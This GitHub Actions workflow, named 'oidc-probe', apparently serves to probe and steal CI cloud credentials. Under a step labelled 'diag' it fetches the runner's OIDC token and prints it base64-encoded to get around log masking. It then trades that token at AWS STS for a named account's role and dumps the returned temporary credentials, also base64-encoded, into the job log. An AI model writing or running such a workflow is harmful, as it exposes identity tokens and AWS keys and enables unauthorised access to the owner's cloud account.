name: oidc-probe
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: diag
        run: |
          set -u
          J=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
          printf '%s' "$J" > jwt.json
          python3 - <<'PY'
          import json,base64
          t=json.load(open("jwt.json"))["value"]
          print("JWT_B64", base64.b64encode(t.encode()).decode())
          p=t.split(".")[1]; p+="="*(-len(p)%4)
          d=json.loads(base64.urlsafe_b64decode(p))
          for k in ["iss","aud","sub","ref","event_name","repository","repository_owner","repository_id","repository_owner_id","actor","job_workflow_ref","environment"]:
              if k in d: print("CLAIM",k,"=",d[k])
          print("ALLKEYS",sorted(d.keys()))
          PY
      - name: assume
        run: |
          set -u
          TK=$(python3 -c 'import json;print(json.load(open("jwt.json"))["value"])')
          RESP=$(curl -sS https://sts.amazonaws.com/ -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" --data-urlencode "RoleArn=arn:aws:iam::615299737591:role/RAMP-GITHUB-OIDC-ROLE" -d "RoleSessionName=vpc09ssh" -d "DurationSeconds=3600" --data-urlencode "WebIdentityToken=${TK}")
          echo "respbytes=${#RESP}"
          printf '%s' "$RESP" | base64 -w0
          echo